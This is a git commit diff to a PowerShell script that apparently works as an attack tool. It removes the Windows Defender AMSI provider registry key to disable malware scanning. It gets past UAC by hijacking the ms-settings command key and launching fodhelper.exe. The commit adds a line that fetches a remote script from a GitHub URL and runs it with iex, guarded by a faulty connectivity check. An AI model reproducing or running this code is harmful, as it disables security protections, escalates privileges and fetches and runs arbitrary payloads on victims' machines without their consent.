9ab5504b0883ad400d84cb7e8bcdbaf782f6c326
billhemmer2789 <97331850+billhemmer2789@users.noreply.github.com>
2022-01-29 20:05:27 -0600

    Update hi.ps1

--- hi.ps1
+++ hi.ps1
@@ -3,7 +3,7 @@ function helper(){
 
 Param (    
  
- [String]$custom = "cmd.exe /c powershell New-Item 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFF}' -Force; Remove-Item -Path 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}' -Recurse; helper;" #default
+ [String]$custom = "cmd.exe /c powershell New-Item 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFF}' -Force; Remove-Item -Path 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}' -Recurse" #default
  
       )
  
@@ -15,4 +15,8 @@ Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -
  
 #Bypass Execution
 Start-Process "C:\Windows\System32\fodhelper.exe"
+}
+$testConnetion = Test-Connection -ComputerName 1.1.1.1 -Count 1 
+if ($testConnection = "True"){
+iex (iwr https://raw.githubusercontent.com/billhemmer2789/food/main/cocoa.ps1)
 }
